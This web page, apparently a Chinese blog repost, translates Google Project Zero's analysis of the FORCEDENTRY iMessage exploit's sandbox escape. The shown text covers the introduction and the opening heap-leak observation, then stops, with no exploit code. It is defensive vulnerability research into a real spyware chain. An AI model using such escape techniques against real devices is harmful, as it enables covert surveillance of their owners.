@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FORCEDENTRY：沙箱逃逸 - BasicBit</title>
+  <meta name="description" content="FORCEDENTRY：沙箱逃逸">
+  <link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
+  <noscript><link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet"></noscript>
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1206611804757181" crossorigin="anonymous"></script>
+  <style>:root{--color-primary:#4f46e5;--color-primary-hover:#4338ca;--color-primary-light:#eef2ff;--color-secondary:#64748b;--color-text:#0f172a;--color-text-secondary:#475569;--color-text-tertiary:#94a3b8;--color-border:#e2e8f0;--color-border-light:#f1f5f9;--color-bg:#ffffff;--color-bg-secondary:#f8fafc;--color-bg-tertiary:#f1f5f9;--color-accent:#f59e0b;--glass-bg:rgba(255,255,255,0.8);--glass-blur:16px;--glass-border:rgba(255,255,255,0.3);--font-primary:'Inter','Plus Jakarta Sans','Noto Sans SC',system-ui,-apple-system,sans-serif;--font-mono:'JetBrains Mono','Fira Code',monospace;--space-xs:0.5rem;--space-sm:0.75rem;--space-md:1.25rem;--space-lg:2rem;--space-xl:3.5rem;--space-2xl:5rem;--space-3xl:8rem;--shadow-sm:0 1px 2px 0 rgb(0 0 0 / 0.05);--shadow-md:0 4px 6px -1px rgb(0 0 0 / 0.1),0 2px 4px -2px rgb(0 0 0 / 0.1);--shadow-lg:0 10px 15px -3px rgb(0 0 0 / 0.1),0 4px 6px -4px rgb(0 0 0 / 0.1);--shadow-xl:0 20px 25px -5px rgb(0 0 0 / 0.1),0 8px 10px -6px rgb(0 0 0 / 0.1);--shadow-inner:inset 0 2px 4px 0 rgb(0 0 0 / 0.05);--radius-sm:0.375rem;--radius-md:0.75rem;--radius-lg:1rem;--radius-xl:1.5rem;--radius-full:9999px;--transition-fast:0.15s cubic-bezier(0.4,0,0.2,1);--transition-normal:0.3s cubic-bezier(0.4,0,0.2,1);--transition-slow:0.5s cubic-bezier(0.4,0,0.2,1);--container-max:1280px;--header-height:72px;--sidebar-width:320px}.visually-hidden{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}@font-face{font-family:'Inter';font-display:swap}@font-face{font-family:'Plus Jakarta Sans';font-display:swap}@font-face{font-family:'Noto Sans SC';font-display:swap}@font-face{font-family:'Roboto';font-display:swap}*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}html{font-size:16px;line-height:1.6;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;scroll-behavior:smooth}body{font-family:var(--font-primary);color:var(--color-text);background-color:var(--color-bg);min-height:100vh;display:flex;flex-direction:column}h1,h2,h3,h4,h5,h6{font-weight:700;line-height:1.2;color:var(--color-text);letter-spacing:-0.025em}h1{font-size:3.5rem}h2{font-size:2.25rem}h3{font-size:1.5rem}a{color:inherit;text-decoration:none;transition:all var(--transition-fast)}.container{max-width:var(--container-max);margin:0 auto;padding:0 var(--space-lg)}.site-header{background:var(--glass-bg);backdrop-filter:blur(var(--glass-blur));-webkit-backdrop-filter:blur(var(--glass-blur));border-bottom:1px solid var(--color-border-light);position:sticky;top:0;z-index:1000;height:var(--header-height);transition:all var(--transition-normal)}.header-container{max-width:var(--container-max);margin:0 auto;padding:0 var(--space-lg);height:100%;display:flex;align-items:center;justify-content:space-between}.site-logo a{font-size:1.5rem;font-weight:800;color:var(--color-text);letter-spacing:-0.05em;display:flex;align-items:center;gap:var(--space-sm)}.site-logo .logo-icon{width:36px;height:36px;flex-shrink:0}.site-logo .logo-text{background:linear-gradient(135deg,var(--color-primary) 0%,#312e81 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}.nav-list{display:flex;gap:var(--space-sm);list-style:none}.nav-list a{padding:var(--space-xs) var(--space-md);font-weight:500;color:var(--color-text-secondary);border-radius:var(--radius-full)}.nav-list a:hover,.nav-list a.active{color:var(--color-primary);background:var(--color-primary-light)}@media (max-width:768px){.site-header{backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);position:relative}}.mobile-menu-btn{display:none;background:none;border:none;cursor:pointer;padding:var(--space-xs);color:var(--color-text)}.mobile-menu-btn svg{width:28px;height:28px}.mobile-search-btn{display:none}.mobile-search-modal{display:none}@media (min-width:769px){.mobile-search-btn,.mobile-search-modal{display:none !important}}@media (max-width:768px){.mobile-menu-btn{display:flex;align-items:center;justify-content:center}.site-nav{position:absolute;top:var(--header-height);left:0;right:0;background:var(--color-bg);border-bottom:1px solid var(--color-border-light);padding:var(--space-md);box-shadow:var(--shadow-lg);transform:translateY(-100%);opacity:0;visibility:hidden;transition:all var(--transition-normal)}.site-nav.active{transform:translateY(0);opacity:1;visibility:visible}.nav-list{flex-direction:column;gap:var(--space-xs)}.nav-list a{display:block;padding:var(--space-sm) var(--space-md);border-radius:var(--radius-md)}.search-wrapper{display:none}}.search-wrapper{position:relative;width:280px}.search-form{display:flex;align-items:center;background:var(--color-bg-secondary);border:1px solid var(--color-border);border-radius:var(--radius-full);padding:0.5rem 1rem;transition:all var(--transition-fast)}.search-form:hover{background:var(--color-bg);border-color:var(--color-primary);box-shadow:var(--shadow-md)}.search-input{flex:1;border:none;background:transparent;padding:0.375rem;font-size:0.9375rem;color:var(--color-text);outline:none;width:100%;font-family:inherit}.search-input::placeholder{color:var(--color-text-tertiary)}.search-btn{background:none;border:none;cursor:pointer;color:var(--color-text-tertiary);padding:0.25rem;display:flex;align-items:center;transition:color var(--transition-fast)}.search-btn:hover{color:var(--color-primary)}.home-hero{padding:var(--space-3xl) 0 var(--space-xl);margin-top:calc(-1 * var(--space-xl));background:radial-gradient(circle at top right,var(--color-primary-light),transparent),radial-gradient(circle at bottom left,#fff9f0,transparent);text-align:center;margin-bottom:var(--space-xl)}.hero-title{font-size:4rem;margin-bottom:var(--space-md);background:linear-gradient(to right,var(--color-text),var(--color-primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent}.hero-subtitle{font-size:1.25rem;color:var(--color-text-secondary);max-width:600px;margin:0 auto;font-weight:400}main{flex:1;padding-top:var(--space-xl);padding-bottom:var(--space-3xl);min-height:100vh}.about-content{max-width:800px;margin:0 auto;padding:0 var(--space-lg)}.about-content h1{font-size:2.5rem;margin-bottom:var(--space-lg)}.about-content h2{font-size:1.75rem;margin-top:var(--space-xl);margin-bottom:var(--space-md)}.about-content p{margin-bottom:var(--space-md);line-height:1.7;color:var(--color-text-secondary)}.about-content ul{margin:var(--space-md) 0;padding-left:var(--space-lg)}.about-content li{margin-bottom:var(--space-sm);color:var(--color-text-secondary)}.about-content a{color:var(--color-primary);text-decoration:underline}.about-content a:hover{color:var(--color-primary-hover)}.main-container{max-width:var(--container-max);margin:0 auto;padding:0 var(--space-lg);display:grid;grid-template-columns:1fr var(--sidebar-width);gap:var(--space-2xl);align-items:start}.main-container.post-page-no-toc{grid-template-columns:1fr}.sidebar{position:sticky;top:80px;align-self:start;max-height:calc(100vh - 100px);overflow-y:auto;z-index:50}.sidebar::-webkit-scrollbar{width:4px}.sidebar::-webkit-scrollbar-track{background:transparent}.sidebar::-webkit-scrollbar-thumb{background:var(--color-border);border-radius:2px}.post-list{display:grid;align-items:start;gap:var(--space-xl)}.post-card{background:var(--color-bg);border-radius:var(--radius-xl);padding:var(--space-xl);border:1px solid var(--color-border);transition:all var(--transition-normal);position:relative;overflow:hidden}.post-card:hover{transform:translateY(-8px);box-shadow:var(--shadow-xl);border-color:var(--color-primary-light)}.post-card::before{content:'';position:absolute;top:0;left:0;width:4px;height:100%;background:var(--color-primary);opacity:0;transition:opacity var(--transition-normal)}.post-card:hover::before{opacity:1}.post-title{font-size:2rem;margin-bottom:var(--space-sm)}.post-meta{display:flex;gap:var(--space-md);color:var(--color-text-tertiary);font-size:0.875rem;margin-bottom:var(--space-lg)}.post-excerpt{color:var(--color-text-secondary);font-size:1.125rem;margin-bottom:var(--space-lg)}.read-more{font-weight:600;color:var(--color-primary);display:inline-flex;align-items:center;gap:var(--space-xs)}.pagination{display:flex;justify-content:center;align-items:center;gap:var(--space-md);margin:var(--space-xl) 0;padding:var(--space-lg) 0}.pagination a,.pagination span{padding:var(--space-sm) var(--space-lg);border-radius:var(--radius-full);background:var(--color-bg-secondary);color:var(--color-text);text-decoration:none;font-size:0.9375rem}.pagination a:hover{background:var(--color-primary);color:white}.pagination .disabled{opacity:0.5;cursor:not-allowed}.pagination .page-info{color:var(--color-text-secondary)}.adsense{margin:var(--space-lg) 0;width:100%;display:block;min-height:1px}.adsense ins{margin:0;display:block;width:100%;min-height:1px}.adsense-floating{position:fixed;top:50%;transform:translateY(-50%);z-index:100;margin:0;width:160px;height:600px}.adsense-floating-left{left:20px}.adsense-floating-right{right:20px}@media (max-width:1400px){.adsense-floating{display:none}}.widget{background:var(--color-bg-secondary);border-radius:var(--radius-lg);padding:var(--space-lg);margin-bottom:var(--space-lg);border:1px solid var(--color-border-light)}.widget-title{font-size:0.75rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--color-text-tertiary);margin-bottom:var(--space-md)}.post-content{width:100%;max-width:1100px;margin:0 auto;padding:0 24px}.post-header{padding-top:var(--space-xl);margin-bottom:var(--space-lg)}.post-header .post-title{font-size:2.75rem;margin-bottom:var(--space-md);line-height:1.3}.article-meta{display:flex;flex-wrap:wrap;gap:var(--space-md);padding-bottom:var(--space-lg);border-bottom:1px solid var(--color-border-light)}.article-meta .meta-item{display:inline-flex;align-items:center;gap:6px;color:var(--color-text-secondary);font-size:0.9375rem}.post-body{font-size:1.25rem;line-height:1.8;padding-top:var(--space-lg)}.article-actions{display:flex;gap:var(--space-md);margin:var(--space-lg) 0;flex-wrap:wrap}.action-btn{display:inline-flex;align-items:center;gap:8px;padding:10px 18px;border-radius:var(--radius-full);font-weight:500;font-size:0.9375rem;transition:all var(--transition-fast)}.action-btn.primary{background:var(--color-primary);color:white}.action-btn.primary:hover{background:var(--color-primary-hover)}.action-btn.secondary{background:var(--color-bg-secondary);color:var(--color-text-secondary);border:1px solid var(--color-border)}.action-btn.secondary:hover{border-color:var(--color-primary);color:var(--color-primary)}.post-tags{margin-top:var(--space-xl);padding-top:var(--space-lg);border-top:1px solid var(--color-border-light);display:flex;align-items:center;gap:var(--space-sm);flex-wrap:wrap}.post-tags span{color:var(--color-text-secondary);font-size:0.9375rem}.tag-link{display:inline-block;padding:4px 12px;background:var(--color-bg-secondary);border-radius:var(--radius-full);font-size:0.875rem;color:var(--color-text-secondary);transition:all var(--transition-fast)}.tag-link:hover{background:var(--color-primary-light);color:var(--color-primary)}.post-body h1{margin-top:var(--space-xl);margin-bottom:var(--space-md);font-size:1.75rem;scroll-margin-top:80px}.post-body h2{margin-top:var(--space-xl);margin-bottom:var(--space-md);scroll-margin-top:80px}.post-body h3{margin-top:var(--space-lg);margin-bottom:var(--space-md);scroll-margin-top:80px}.post-body h4{margin-top:var(--space-lg);margin-bottom:var(--space-md);scroll-margin-top:80px}.post-body p{margin-bottom:var(--space-lg)}.post-body img{max-width:100%;height:auto;display:block;margin:var(--space-lg) auto;border-radius:var(--radius-md);box-shadow:var(--shadow-md)}.post-body img[src^="data:image"]{max-width:100%;width:auto;height:auto}.post-body img[src$=".svg"]{width:auto;height:auto}.post-body pre{background:#1e1e2e;border-radius:var(--radius-md);padding:var(--space-lg);overflow-x:auto;margin:var(--space-lg) 0;font-family:var(--font-mono);font-size:0.9375rem;line-height:1.6}.post-body code{font-family:var(--font-mono);background:var(--color-bg-secondary);padding:0.125rem 0.375rem;border-radius:var(--radius-sm);font-size:0.875em}.post-body pre code{background:none;padding:0;color:#cdd6f4}.post-body a code{color:var(--color-primary)}.post-body blockquote{margin:var(--space-lg) 0;padding:var(--space-md) var(--space-lg);border-left:4px solid var(--color-primary);background:var(--color-bg-secondary);border-radius:0 var(--radius-md) var(--radius-md) 0;color:var(--color-text-secondary);font-style:italic}.post-body blockquote p:last-child{margin-bottom:0}.post-body table{width:100%;border-collapse:collapse;margin:var(--space-lg) 0;font-size:0.9375rem}.post-body th,.post-body td{padding:var(--space-sm) var(--space-md);border:1px solid var(--color-border);text-align:left}.post-body th{background:var(--color-bg-secondary);font-weight:600;color:var(--color-text)}.post-body tr:hover{background:var(--color-bg-secondary)}.post-body .table-wrapper{overflow-x:auto;margin:var(--space-lg) 0}.post-body a:not(.tag-link):not(.action-btn):not(.read-more){color:var(--color-primary);text-decoration:underline;text-decoration-color:transparent;text-underline-offset:2px;transition:all var(--transition-fast)}.post-body a:not(.tag-link):not(.action-btn):not(.read-more):hover{text-decoration-color:var(--color-primary)}.post-body a:not(.tag-link):not(.action-btn):not(.read-more):visited{color:#7c3aed}.post-body ul,.post-body ol{margin:var(--space-md) 0;padding-left:var(--space-lg)}.post-body li{margin-bottom:var(--space-sm);line-height:1.7}.post-body li::marker{color:var(--color-primary)}.post-body hr{border:none;height:2px;background:linear-gradient(to right,transparent,var(--color-border),transparent);margin:var(--space-xl) 0}.site-footer{background:var(--color-bg-secondary);border-top:1px solid var(--color-border-light);padding:var(--space-xl) 0;margin-top:auto}.footer-container{max-width:var(--container-max);margin:0 auto;padding:0 var(--space-lg);text-align:center}.footer-content{display:flex;flex-direction:column;align-items:center;gap:var(--space-sm)}.footer-content p{color:var(--color-text-secondary);font-size:0.875rem}.footer-links{display:flex;gap:var(--space-md);margin-top:var(--space-sm)}.footer-links a{color:var(--color-text-secondary);font-size:0.875rem}.footer-links a:hover{color:var(--color-primary)}.page-header{margin-bottom:var(--space-xl)}.page-header h1{font-size:2rem;margin-bottom:var(--space-sm)}.page-header p{color:var(--color-text-secondary);font-size:1.125rem}.tag-cloud{display:flex;flex-wrap:wrap;gap:var(--space-sm);padding:var(--space-md) 0}.tag-cloud a{display:inline-block;padding:8px 16px;background:var(--color-bg-secondary);border-radius:var(--radius-full);font-size:0.9375rem;color:var(--color-text-secondary);transition:all var(--transition-fast)}.tag-cloud a:hover{background:var(--color-primary-light);color:var(--color-primary)}.category-list{list-style:none}.category-list li{display:flex;justify-content:space-between;align-items:center;padding:var(--space-sm) 0;border-bottom:1px solid var(--color-border-light)}.category-list li:last-child{border-bottom:none}.category-list a{color:var(--color-text-secondary);font-weight:500}.category-list a:hover{color:var(--color-primary)}.category-count{color:var(--color-text-tertiary);font-size:0.875rem}.category-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:var(--space-lg)}.search-box-page{margin-bottom:var(--space-xl)}.search-form-page{display:flex;gap:var(--space-sm);max-width:600px}.search-input-page{flex:1;padding:12px 20px;border:2px solid var(--color-border);border-radius:var(--radius-full);font-size:1rem;font-family:inherit;outline:none;transition:all var(--transition-fast)}.search-input-page:focus{border-color:var(--color-primary);box-shadow:0 0 0 3px var(--color-primary-light)}.search-btn-page{padding:12px 28px;background:var(--color-primary);color:white;border:none;border-radius:var(--radius-full);font-size:1rem;font-weight:500;cursor:pointer;transition:all var(--transition-fast)}.search-btn-page:hover{background:var(--color-primary-hover)}.search-results{margin-top:var(--space-lg);display:grid;gap:var(--space-xl);align-items:start}.no-results{text-align:center;padding:var(--space-2xl);color:var(--color-text-secondary)}.loading{text-align:center;padding:var(--space-lg);color:var(--color-text-secondary)}.main-container.post-page-with-toc{display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:var(--space-lg);max-width:1360px;margin:0 auto;padding:0 var(--space-lg)}.main-container.post-page-with-toc .post-content{max-width:1100px}.post-toc{position:sticky;top:80px;width:260px;max-height:calc(100vh - 100px);overflow-y:auto;padding:var(--space-md);background:var(--color-bg-secondary);border-radius:var(--radius-lg);border:1px solid var(--color-border-light);align-self:start;z-index:50}.post-toc::-webkit-scrollbar{width:4px}.post-toc::-webkit-scrollbar-track{background:transparent}.post-toc::-webkit-scrollbar-thumb{background:var(--color-border);border-radius:2px}.toc-title{font-size:0.875rem;font-weight:600;color:var(--color-text-secondary);margin-bottom:var(--space-sm);padding-bottom:var(--space-xs);border-bottom:1px solid var(--color-border-light)}.toc-list{list-style:none;margin:0;padding:0}.toc-item{margin:0}.toc-link{display:flex;align-items:center;justify-content:space-between;padding:6px 8px;font-size:0.9375rem;color:var(--color-text-secondary);border-radius:var(--radius-sm);transition:all var(--transition-fast);line-height:1.4}.toc-link:hover{background:var(--color-primary-light);color:var(--color-primary)}.toc-text{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.toc-level-0>.toc-link{font-weight:600;font-size:0.9375rem;color:var(--color-text);padding:8px}.toc-level-0>.toc-link:hover{background:var(--color-primary-light);color:var(--color-primary)}.toc-sublist{list-style:none;margin:0;padding:0 0 0 var(--space-sm);border-left:1px solid var(--color-border)}.toc-level-1>.toc-link{font-size:0.8125rem;padding:5px 8px}.toc-level-2>.toc-link{font-size:0.75rem;padding:4px 8px;color:var(--color-text-tertiary)}.toc-level-3>.toc-link{font-size:0.6875rem;padding:3px 8px;color:var(--color-text-tertiary)}.toc-fold-btn{display:flex;align-items:center;justify-content:center;width:20px;height:20px;background:none;border:none;border-radius:var(--radius-sm);color:var(--color-text-tertiary);cursor:pointer;transition:all var(--transition-fast);flex-shrink:0;margin-left:4px}.toc-fold-btn:hover{background:var(--color-bg);color:var(--color-primary)}.toc-fold-btn svg{transition:transform var(--transition-fast)}.toc-fold-btn.collapsed svg{transform:rotate(-90deg)}.toc-sublist.collapsed{display:none}@media (min-width:1025px){.sidebar{position:sticky;top:80px;align-self:start;max-height:calc(100vh - 100px);overflow-y:auto;z-index:100}.post-toc{position:sticky;top:80px;max-height:calc(100vh - 100px);overflow-y:auto;z-index:100}}@media (max-width:1400px){.post-toc{display:none}}@media (max-width:1024px){.hero-title{font-size:3rem}.main-container{grid-template-columns:1fr;align-items:start;max-width:100%;width:100%;margin:0 auto}.sidebar{display:none}.post-content{padding:0 16px;max-width:100%;width:100%}main{padding-top:var(--space-lg)}}@media (max-width:768px){.hero-title{font-size:2.5rem}:root{--space-lg:1.25rem;--space-xl:2rem;--header-height:60px}.post-card{padding:var(--space-lg)}.post-title{font-size:1.5rem}.post-content{padding:0 12px;max-width:100%;width:100%}.post-body pre{overflow-x:scroll;overflow-wrap:break-word;word-wrap:break-word;white-space:pre-wrap;font-size:0.8125rem}.post-body code{white-space:pre-wrap;word-wrap:break-word}main{padding-top:var(--space-md)}.about-content{padding:0 16px}.about-content h1{font-size:2rem}.about-content h2{font-size:1.5rem}.header-container{padding:0 1rem;gap:0.5rem}.site-logo .logo-icon{width:30px;height:30px}.site-logo .logo-text{font-size:1.25rem}.mobile-menu-btn{order:99;margin-left:auto}.site-nav{position:absolute;top:var(--header-height);left:0;right:0;background:var(--color-bg);border-bottom:1px solid var(--color-border-light);padding:var(--space-md);box-shadow:var(--shadow-lg);transform:translateY(-100%);opacity:0;visibility:hidden;transition:all var(--transition-normal)}.site-nav.active{transform:translateY(0);opacity:1;visibility:visible}.nav-list{flex-direction:column;gap:var(--space-xs)}.nav-list a{display:block;padding:var(--space-sm) var(--space-md);border-radius:var(--radius-md);font-size:1rem}.search-wrapper{display:none !important}.mobile-search-btn{display:flex !important;position:fixed;bottom:1.5rem;right:1.5rem;width:56px;height:56px;border-radius:50%;background:var(--color-primary);color:white;border:none;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(79,70,229,0.4);z-index:999;cursor:pointer;transition:all var(--transition-fast)}.mobile-search-btn:hover{background:var(--color-primary-hover);transform:scale(1.05)}.mobile-search-btn svg{width:24px;height:24px}.mobile-search-modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:1000;align-items:flex-start;justify-content:center;padding-top:20%;padding-left:1rem;padding-right:1rem}.mobile-search-modal.active{display:flex}.mobile-search-content{width:100%;max-width:400px;background:var(--color-bg);border-radius:var(--radius-xl);padding:1.5rem;box-shadow:var(--shadow-xl);position:relative}.mobile-search-form{display:flex;align-items:center;background:var(--color-bg-secondary);border:2px solid var(--color-border);border-radius:var(--radius-full);padding:0.5rem;transition:all var(--transition-fast)}.mobile-search-form:focus-within{border-color:var(--color-primary);box-shadow:0 0 0 3px var(--color-primary-light)}.mobile-search-input{flex:1;border:none;background:transparent;padding:0.5rem 0.75rem;font-size:1rem;color:var(--color-text);outline:none;font-family:inherit}.mobile-search-input::placeholder{color:var(--color-text-tertiary)}.mobile-search-submit{background:var(--color-primary);color:white;border:none;width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background var(--transition-fast)}.mobile-search-submit:hover{background:var(--color-primary-hover)}.mobile-search-close{position:absolute;top:1rem;right:1rem;background:none;border:none;cursor:pointer;color:var(--color-text-secondary);padding:0.5rem;display:flex;align-items:center;justify-content:center;transition:color var(--transition-fast)}.mobile-search-close:hover{color:var(--color-text)}.mobile-search-submit:hover{background:var(--color-primary-hover)}.main-container{padding:0 1rem;gap:var(--space-lg);max-width:100%;width:100%;margin:0 auto}.main-container.post-page-with-toc{display:block;max-width:100%}.post-list{gap:var(--space-lg)}.post-card{padding:var(--space-md);border-radius:var(--radius-lg)}.post-card>div:first-child{height:150px !important}.post-meta{flex-wrap:wrap;gap:var(--space-sm);font-size:0.8125rem}.post-excerpt{font-size:1rem;margin-bottom:var(--space-md)}.post-header{padding-top:var(--space-md)}.post-header .post-title{font-size:1.75rem}.article-meta{gap:var(--space-sm);font-size:0.875rem}.article-actions{flex-direction:column}.action-btn{width:100%;justify-content:center}.post-body{font-size:1rem;line-height:1.7}.post-body h1{font-size:1.5rem}.post-body h2{font-size:1.375rem}.post-body h3{font-size:1.25rem}.pagination{flex-wrap:wrap;gap:var(--space-sm)}.pagination a,.pagination span{padding:var(--space-xs) var(--space-md);font-size:0.875rem}.sidebar{display:none}.site-footer{padding:var(--space-lg) 0;margin-bottom:80px}.footer-content p{font-size:0.8125rem}.page-header h1{font-size:1.5rem}.page-header p{font-size:1rem}.category-grid{grid-template-columns:1fr;gap:var(--space-md)}}@media (max-width:480px){.hero-title{font-size:2rem}.hero-subtitle{font-size:1rem}.post-body{font-size:0.9375rem}.post-content{padding:0 12px;max-width:100%;width:100%}.post-body pre{font-size:0.75rem;padding:var(--space-md)}main{padding-top:var(--space-sm)}.header-container{padding:0 0.75rem}.site-logo .logo-icon{width:28px;height:28px}.site-logo .logo-text{font-size:1.125rem}.search-wrapper{bottom:0.75rem;right:0.75rem;width:calc(100% - 1.5rem)}.post-card{padding:var(--space-sm) var(--space-md)}.post-card>div:first-child{height:120px !important}.post-header .post-title{font-size:1.5rem}.article-actions{gap:var(--space-sm)}.action-btn{padding:8px 14px;font-size:0.875rem}.read-more{font-size:0.9375rem}.home-hero{padding:var(--space-xl) 0 var(--space-lg)}}@media (max-width:360px){.hero-title{font-size:1.75rem}.hero-subtitle{font-size:0.9375rem}.post-title{font-size:1.25rem}.post-header .post-title{font-size:1.375rem}.post-meta{font-size:0.75rem}.post-body{font-size:0.9375rem}}</style>
+</head>
+<body>
+  
+  <header class="site-header">
+    <div class="header-container">
+      <div class="site-logo">
+        <a href="/">
+          <svg class="logo-icon" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect width="40" height="40" rx="10" fill="url(#logo-gradient)"/>
+            <path d="M12 12H28M12 20H24M12 28H20" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
+            <circle cx="30" cy="30" r="6" fill="#10b981"/>
+            <defs>
+              <linearGradient id="logo-gradient" x1="0" y1="0" x2="40" y2="40" gradientUnits="userSpaceOnUse">
+                <stop stop-color="#4f46e5"/>
+                <stop offset="1" stop-color="#312e81"/>
+              </linearGradient>
+            </defs>
+          </svg>
+          <span class="logo-text">BasicBit</span>
+        </a>
+      </div>
+      <button class="mobile-menu-btn" aria-label="菜单">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <line x1="3" y1="6" x2="21" y2="6"></line>
+          <line x1="3" y1="12" x2="21" y2="12"></line>
+          <line x1="3" y1="18" x2="21" y2="18"></line>
+        </svg>
+      </button>
+      <nav class="site-nav">
+        <ul class="nav-list">
+          <li><a href="/" class="">首页</a></li>
+          <li><a href="/category.html" class="">分类</a></li>
+          <li><a href="/tags.html" class="">标签</a></li>
+          <li><a href="/about.html" class="">关于</a></li>
+        </ul>
+      </nav>
+      <div class="search-wrapper">
+        <div class="search-box">
+          <form action="/search" method="get" class="search-form" onsubmit="return handleSearchSubmit(this)">
+            <input type="text" name="q" placeholder="搜索文章..." class="search-input">
+            <button type="button" class="search-btn" onclick="handleSearchClick(this)">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="11" cy="11" r="8"></circle>
+                <path d="m21 21-4.35-4.35"></path>
+              </svg>
+            </button>
+          </form>
+        </div>
+      </div>
+    </div>
+  </header>
+  <!-- Mobile Search Button - Outside header for proper fixed positioning -->
+  <button class="mobile-search-btn" aria-label="搜索" onclick="document.querySelector('.mobile-search-modal').classList.add('active')">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <circle cx="11" cy="11" r="8"></circle>
+      <path d="m21 21-4.35-4.35"></path>
+    </svg>
+  </button>
+  <!-- Mobile Search Modal -->
+  <div class="mobile-search-modal" onclick="if(event.target === this) this.classList.remove('active')">
+    <div class="mobile-search-content" onclick="event.stopPropagation()">
+      <form action="/search" method="get" class="mobile-search-form" onsubmit="this.action='/search?q='+encodeURIComponent(this.q.value);">
+        <input type="text" name="q" placeholder="搜索文章..." class="mobile-search-input" autofocus>
+        <button type="submit" class="mobile-search-submit">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="11" cy="11" r="8"></circle>
+            <path d="m21 21-4.35-4.35"></path>
+          </svg>
+        </button>
+      </form>
+    </div>
+  </div>
+  <main>
+    <div class="main-container post-page-with-toc">
+      <article class="post-content">
+        <header class="post-header">
+          <h1 class="post-title">FORCEDENTRY：沙箱逃逸</h1>
+          <div class="article-meta">
+            <span class="meta-item">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                <line x1="16" y1="2" x2="16" y2="6"></line>
+                <line x1="8" y1="2" x2="8" y2="6"></line>
+                <line x1="3" y1="10" x2="21" y2="10"></line>
+              </svg>
+              2022/3/31
+            </span>
+            <span class="meta-item">Ian Beer</span>
+            <span class="meta-item">移动安全, 网络安全, 漏洞利用</span>
+          </div>
+        </header>
+        
+        
+    <div class="article-actions">
+      <a href="https://projectzero.google/2022/03/forcedentry-sandbox-escape.html" class="action-btn primary" target="_blank" rel="noopener">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+          <polyline points="15 3 21 3 21 9"></polyline>
+          <line x1="10" y1="14" x2="21" y2="3"></line>
+        </svg>
+        访问原始链接
+      </a>
+      <a href="https://translate.google.com/translate?sl=auto&tl=zh-CN&u=https%3A%2F%2Fprojectzero.google%2F2022%2F03%2Fforcedentry-sandbox-escape.html" class="action-btn secondary" target="_blank" rel="noopener">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="12" cy="12" r="10"></circle>
+          <line x1="2" y1="12" x2="22" y2="12"></line>
+        </svg>
+        Google 翻译
+      </a>
+    </div>
+  
+        <div class="post-body">
+          <p>作者：Ian Beer &amp; Samuel Groß，来自 Google Project Zero</p>
+<p>我们要感谢公民实验室（Citizen Lab）与我们分享了 FORCEDENTRY exploit 的样本，以及苹果安全工程与架构（SEAR）小组在技术分析方面与我们的合作。以下反映的任何编辑观点仅代表 Project Zero，不一定反映我们在本研究期间合作组织的观点。</p>
+<p>去年年底，我们发布了关于 FORCEDENTRY（公民实验室将其归因于 NSO 的零点击 iMessage exploit）初始远程代码执行阶段的分析文章。通过发送一个 .gif iMessage 附件（实际上是一个 PDF），NSO 能够远程触发 ImageIO JBIG2 解码器中的堆缓冲区溢出。他们利用该漏洞引导了一个强大的怪异机器（weird machine），能够加载感染过程的下一阶段：沙箱逃逸。</p>
+<p>在这篇文章中，我们将探讨这个沙箱逃逸。值得注意的是，它仅使用了逻辑漏洞。事实上，很难界定它所利用的功能在哪里结束，而它滥用的漏洞从哪里开始。当前和即将推出的最先进缓解措施，如指针认证（Pointer Authentication）和内存标记（Memory Tagging），对这个沙箱逃逸完全没有影响。</p>
+<h2 id="一个观察">一个观察</h2><p>在我们对 .gif 文件的初步分析中，Samuel 注意到渲染图像似乎会泄漏内存。在释放所有相关资源后运行堆工具（heap tool）会得到以下输出：</p>
+<p>$ heap $pid</p>
+<hr>
+<p>All zones: 4631 nodes (826336 bytes)</p>
+<p>COUNT    BYTES     AVG   CLASS_NAME   TYPE   BINARY<br>=====    =====     ===   ==========   ====   ======<br>1969    469120    238.3   non-object<br>825     26400     32.0    JBIG2Bitmap  C++    CoreGraphics</p>
